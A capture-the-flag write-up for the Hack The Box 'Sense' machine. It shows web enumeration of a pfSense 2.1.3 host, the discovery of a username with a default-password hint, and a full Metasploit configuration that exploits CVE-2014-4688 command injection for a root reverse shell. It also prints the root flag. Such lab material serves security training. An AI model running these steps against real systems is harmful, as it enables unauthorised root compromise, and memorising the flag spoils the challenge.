# HTB Sense (Writeup)

**Difficulty:** Easy  
**Operating System:** FreeBSD (pfSense 2.1.3-RELEASE)  
**Tools:** Nmap, Feroxbuster, cURL, Metasploit 

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- <IP>
```

Key findings:

```text
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
```

### Observations

- Ports **80/tcp** and **443/tcp** expose `lighttpd 1.4.35`, an old version of the web server.
- The self-signed TLS certificate contains placeholder values such as `YOUR name` and `CompanyName`, suggesting a default pfSense installation.
- The `pfsense_ng` theme, identified later in the web root, is consistent with pfSense 2.1.x.
- Visiting `https://<IP>/` displays the pfSense login page.

---

## 2. Web Enumeration

### Directory brute-force with Feroxbuster

```bash
feroxbuster -u https://<IP>/ -k \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x txt,php,html,conf,xml -t 40 -d 3
```

Notable results:

```text
200  /index.php
200  /xmlrpc.php
200  /installer/installer.php
200  /tree/
200  /fred.png
301  /themes/
301  /css/
301  /javascript/
301  /widgets/
301  /classes/
301  /includes/
```

### Interesting files and paths

- **`/installer/installer.php`** - redirects to the standard login form; the installer is protected.
- **`/tree/`** - an unrelated SilverStripe Tree Control demo and a distraction.
- **`/fred.png`** - a roughly 95 KB image, unusually large for a typical pfSense theme asset.

### XML-RPC enumeration

The `xmlrpc.php` endpoint is reachable without authentication. To test one of the methods:

```bash
curl -k -s -X POST https://<IP>/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pfsense.get_notices</methodName></methodCall>'
```

The response indicates authentication is required:

```xml
<methodResponse>
  <params>
    <param>
      <value><string>Authentication failed</string></value>
    </param>
  </params>
</methodResponse>
```

The `pfsense.host_firmware_version` method requires exactly one parameter, which provides another clue about the pfSense version. Most other methods return `Unknown method`, so the exposed XML-RPC interface appears limited.

No unauthenticated remote code execution was identified through XML-RPC, so enumeration continued elsewhere in the web root.

---

## 3. Credential Discovery

Two files in the web root are particularly relevant:

```bash
curl -k https://<IP>/system-users.txt
curl -k https://<IP>/changelog.txt
```

The `system-users.txt` file contains:

```text
username: Rohit
password: company defaults
```

The phrase **“company defaults”** hints at the default pfSense password, `pfsense`.


## 4. Exploitation - Authenticated Remote Code Execution

The target runs **pfSense 2.1.3-RELEASE**, which is vulnerable to **CVE-2014-4688**. The vulnerability involves command injection in `status_rrd_graph_img.php`, where the `database` parameter is passed to a shell without adequate sanitization.

### Metasploit

Launch Metasploit and configure the exploit module:

```text
msfconsole
use exploit/unix/http/pfsense_graph_injection_exec
set RHOSTS <IP>
set RPORT 443
set SSL true
set USERNAME rohit
set PASSWORD pfsense
set LHOST <YOUR_TUN0_IP>
set LPORT 4444
run
```

### Important configuration details

- Use **port 443** and set **`SSL true`**, because the target's pfSense interface is served over HTTPS.
- The module targets the vulnerable pfSense graph functionality.
- Set `LHOST` to the IP address of your own VPN interface (for example, `tun0`) that the target can reach.

A successful exploit opens a Meterpreter session running as `root`:

```text
meterpreter > getuid
Server username: root
```

No separate privilege-escalation step is required because the vulnerable functionality executes commands with root privileges.

The `post/multi/recon/local_exploit_suggester` module may not return useful results for this FreeBSD target; local privilege escalation is unnecessary once the root session has been obtained.

---

## 5. Flags

### `root.txt`

From the root Meterpreter session:

```text
meterpreter > shell
```

Then read the flag:

```bash
cat /root/root.txt
```

**Flag:**

```text
d08c32a5d4f8c8b10e76eb51a69f1a86
```

### `user.txt`

Locate and read the user flag:

```bash
find / -name "user.txt" 2>/dev/null
cat /home/rohit/user.txt
```

---

## Summary

1. Identified an old pfSense installation through Nmap and the TLS certificate.
2. Enumerated the web root and inspected exposed files.
3. Discovered a username and a hint to the default pfSense password.
4. Authenticated to the web interface.
5. Used the pfSense graph-injection vulnerability to obtain a root session.
6. Retrieved `root.txt` and `user.txt`.
